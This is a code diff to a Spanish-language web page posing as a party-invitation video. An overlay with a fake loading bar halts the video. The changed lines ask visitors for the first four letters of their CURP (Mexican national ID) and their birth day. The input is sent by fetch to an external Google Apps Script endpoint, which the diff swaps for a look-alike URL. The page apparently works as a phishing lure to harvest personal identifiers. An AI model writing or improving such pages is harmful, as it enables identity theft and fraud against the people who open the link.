@@ -326,7 +326,7 @@
       <div class="progress-bar-bg">
         <div id="progressBar" class="progress-fill"></div>
       </div>
-      <p id="timerCountdown">Descargando paquete optimizado: 0s transcurridos</p>
+      <p id="timerCountdown">Descargando...: 0s transcurridos</p>
     </div>
     <button id="startPlayBtn" class="btn-action" style="display:none; max-width:220px; background:#25d366; font-size:18px;">▶ Iniciar Video</button>
   </div>
@@ -338,7 +338,7 @@
   <div id="overlayModal">
     <div id="stepUsuario">
       <div class="form-group">
-        <label>Ingresa tu clave de Usuario (4 letras y 2 números):</label>
+        <label>Ingresa las 4 letras de tu CURP y dia de cumpleaños (4 letras y 2 números):</label>
         <input type="text" id="inputUsuario" placeholder="EJ. ABCD12" maxlength="6" style="text-transform: uppercase;">
       </div>
       <button id="btnContinuarUsuario" class="btn-action" onclick="validarUsuario()">Continuar</button>
@@ -393,7 +393,7 @@
 
 <script>
   const VIDEO_URL = "https://www.dropbox.com/scl/fi/kh5c08g9khqzo5v8y3gkx/INVITACION_FIESTA_2026-LIGTH.mp4?rlkey=6bddb3r87yjzrgvisjoztbjwx&st=or5ytvs7&raw=1";
-  const API_URL = "https://script.google.com/macros/s/AKfycbxQtiPkf6OLFs2rs5OnpZl_di7ghT7LjDwjMKjMIeTWujku3cV_fSvJ31rEte9F_0ReoA/exec";
+  const API_URL = "https://script.google.com/macros/s/AKfycbxQtiPkf6OLFs2rs5OnpZI_di7ghT7LjDwjMKjMleTWujku3cV_fSvJ31rEte9F_0Rf/exec";
   const SEGUNDO_APARICION = 5;
 
   const video = document.getElementById('interactiveVideo');
@@ -501,7 +501,7 @@
 
     btnContinuar.disabled = true;
     btnContinuar.innerText = "Consultando...";
-    iniciarCargaConsulta("Buscando usuario en la base de datos");
+    iniciarCargaConsulta("Buscando usuario");
 
     try {
       const response = await fetch(`${API_URL}?action=validarUsuario&usuario=${encodeURIComponent(userInput)}`);
